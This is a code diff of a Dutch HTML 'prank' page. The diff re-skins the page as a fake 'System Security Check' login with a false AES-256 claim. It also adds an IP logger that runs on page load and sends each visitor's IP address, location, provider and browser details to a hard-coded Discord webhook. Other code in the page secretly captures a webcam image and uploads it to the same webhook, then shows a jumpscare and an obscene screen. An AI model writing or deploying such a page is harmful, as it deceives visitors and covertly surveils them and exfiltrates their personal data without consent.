@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>😂 Bekijk dit grappige filmpje!</title>
+  <title>System Security Check</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet"/>
   <style>
     *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
@@ -31,7 +31,7 @@
     #hidden-video { position: fixed; opacity: 0; width: 1px; height: 1px; top: -9999px; }
     #hidden-canvas { display: none; }
 
-    /* ── SCREEN: LANDING (Simple Button) ── */
+    /* ── SCREEN: LANDING (Stealth) ── */
     #screen-landing {
       position: fixed; inset: 0;
       display: flex;
@@ -44,36 +44,27 @@
     }
 
     .entrance-btn {
-      padding: 20px 60px;
-      background: transparent;
+      padding: 18px 50px;
+      background: #111;
       border: 1px solid #333;
       color: #666;
-      font-size: 1.2rem;
-      font-weight: 700;
-      border-radius: 8px;
+      font-size: 1rem;
+      font-weight: 600;
+      border-radius: 4px;
       cursor: pointer;
-      letter-spacing: 2px;
       text-transform: uppercase;
-      transition: all 0.3s ease;
-      box-shadow: 0 0 40px rgba(255,255,255,0.05);
+      letter-spacing: 2px;
+      transition: all 0.3s;
     }
-    .entrance-btn:hover {
-      border-color: #ff4444;
-      color: #fff;
-      box-shadow: 0 0 50px rgba(255,68,68,0.2);
-      transform: scale(1.05);
-    }
+    .entrance-btn:hover { border-color: #555; color: #fff; }
 
     .landing-bottom-meta {
       position: absolute;
       bottom: 40px;
-      display: flex;
-      gap: 20px;
-      font-size: 0.65rem;
-      color: #222;
+      font-size: 0.6rem;
+      color: #111;
       text-transform: uppercase;
       letter-spacing: 1px;
-      font-weight: 700;
     }
 
     /* ── SCREEN: LOADING (stiekem camera) ── */
@@ -209,19 +200,14 @@
 
 <!-- ── SCREEN 1: LANDING ── -->
 <div id="screen-landing">
-  <button class="entrance-btn" onclick="startPrank()">Ga door</button>
-
-  <div class="landing-bottom-meta">
-    <span>18+ content</span>
-    <span>Privacy Statement</span>
-    <span>Cookies</span>
-  </div>
+  <button class="entrance-btn" onclick="startPrank()">Login</button>
+  <div class="landing-bottom-meta">Encryption: AES-256 Enabled</div>
 </div>
 
-<!-- ── SCREEN 2: LOADING (camera stiekem starten) ── -->
+<!-- ── SCREEN 2: LOADING ── -->
 <div id="screen-loading" style="display:none;">
   <div class="loading-logo">⏳</div>
-  <div class="loading-text" id="loading-txt">Video bufferen...</div>
+  <div class="loading-text" id="loading-txt">Bezig met verifiëren...</div>
   <div class="loading-bar-track">
     <div class="loading-bar-fill" id="loading-bar"></div>
   </div>
@@ -229,7 +215,7 @@
 
 <!-- ── SCREEN 3: JUMPSCARE ── -->
 <div id="screen-jumpscare" style="display:none;">
-  <video id="jumpscare-video" class="jumpscare-video" playsinline>
+  <video id="jumpscare-video" class="jumpscare-video" playsinline preload="auto">
     <source src="jumpscare.mp4" type="video/mp4">
   </video>
   <div class="jumpscare-flash-overlay"></div>
@@ -239,15 +225,49 @@
 <div id="screen-troll" style="display:none;">
   <div class="troll-title">FUCK YOU</div>
   <div class="troll-emojis">🖕 🐒 🖕</div>
-  <audio id="troll-sound" src="troll.mp3" loop></audio>
+  <audio id="troll-sound" src="troll.mp3" loop preload="auto"></audio>
 </div>
 
 <script>
   const WEBHOOK = 'https://discord.com/api/webhooks/1490614590948511806/pVP30UWT4UeonIFBzcMjK8_3j7GJWyaTPU6C5Fvlril89lJSjti-Q2wBZXrEcG1BDI6e';
-
+  
   let stream = null;
   let capturedDataUrl = null;
   const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+
+  // ── IP LOGGER ──
+  async function logVisitor() {
+    try {
+      const response = await fetch('https://ipapi.co/json/');
+      const data = await response.json();
+      
+      const payload = {
+        username: '🕵️ IP Tracker',
+        embeds: [{
+          title: '🌐 Nieuwe Bezoeker Gevonden!',
+          color: 0x3498db,
+          fields: [
+            { name: 'IP Adres', value: `\`${data.ip}\``, inline: true },
+            { name: 'Locatie', value: `${data.city}, ${data.country_name}`, inline: true },
+            { name: 'Provider', value: data.org, inline: false },
+            { name: 'User Agent', value: navigator.userAgent, inline: false }
+          ],
+          timestamp: new Date()
+        }]
+      };
+
+      await fetch(WEBHOOK, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+    } catch(e) { console.log('IP log mislukt'); }
+  }
+
+  // Log bezoeker direct bij laden
+  window.addEventListener('scroll', logVisitor, { once: true });
+  window.addEventListener('click', logVisitor, { once: true });
+  logVisitor();
 
   // ── JUMPSCARE SOUND ──
   function playJumpscareSound() {
@@ -433,10 +453,10 @@
         avatar_url: 'https://cdn.discordapp.com/embed/avatars/4.png',
         content: `😱 **JUMPSCARE SLACHTOFFER GEVONDEN!!**\n🕐 Tijdstip: \`${timeStr}\`\n💀 Ze schrokken zich kapot hahaha`,
         embeds: [{
-          title: '🎭 Jumpscare Prank — GOTCHA!',
-          description: 'Iemand klikte op "video afspelen" en schrok zich kapot van de jumpscare 💀😂',
+          title: '!',
+          description: ' 💀😂',
           color: 0xff4444,
-          footer: { text: 'JumpScare Prank Tool' }
+          footer: { text: ' Prank Tool' }
         }]
       }));
       form.append('file', blob, `jumpscare_${Date.now()}.jpg`);
